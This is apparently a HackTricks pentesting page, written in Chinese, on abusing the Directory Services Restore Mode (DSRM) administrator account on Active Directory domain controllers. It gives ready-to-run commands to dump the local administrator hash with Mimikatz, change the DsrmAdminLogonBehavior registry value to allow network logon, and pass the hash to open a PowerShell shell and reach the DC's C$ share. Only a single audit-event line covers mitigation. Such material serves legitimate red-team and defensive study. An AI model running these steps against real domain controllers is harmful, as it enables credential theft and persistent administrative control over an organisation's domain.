{{#include ../../banners/hacktricks-training.md}}

# DSRM 凭据

每个 **DC** 内部都有一个 **本地管理员** 账户。拥有该机器的管理员权限后，您可以使用 mimikatz 来 **转储本地管理员哈希**。然后，修改注册表以 **激活此密码**，以便您可以远程访问此本地管理员用户。\
首先，我们需要 **转储** **DC** 内部 **本地管理员** 用户的 **哈希**：
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
然后我们需要检查该账户是否有效，如果注册表项的值为 "0" 或者不存在，则需要 **将其设置为 "2"**：
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
然后，使用 PTH，您可以 **列出 C$ 的内容或甚至获得一个 shell**。请注意，要使用内存中的哈希（用于 PTH）创建新的 powershell 会话时，**使用的“域”只是 DC 机器的名称：**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
更多信息请参见：[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 和 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## 缓解措施

- 事件 ID 4657 - 审计创建/更改 `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
